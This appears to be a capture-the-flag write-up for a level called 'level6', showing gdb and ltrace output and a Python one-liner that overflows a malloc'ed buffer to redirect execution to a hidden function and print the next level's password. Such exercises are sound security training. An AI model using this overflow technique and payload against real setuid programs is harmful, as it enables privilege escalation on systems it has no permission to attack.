```sh
$> ls -l ~
-rwsr-s---+ 1 level7 users 5274 Mar  6  2016 level6
```

We have to call `n()` to retrieve the password.  
To do that, we can use `strcpy()` to overflow the malloc'ed buffer and change the return address to `n()` instead of `m()`.

```sh
$> gdb -q ./level6
(gdb) i func n
[...]
0x08048454  n
```

To know where to find the return address we'll change, we need to access the buffer. Thanks to `ltrace`, we know the address of the malloc'ed buffer

```sh
$> ltrace ./level
malloc(64) = 0x0804a008
[...]
```

After some tweaks, we find that the return address has an offset of `72 bytes` from the start of the buffer.

That's all we need to create the payload:

```sh
$> ./level6 $(python -c 'print("\x90"*72 + "\x54\x84\x04\x08")')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
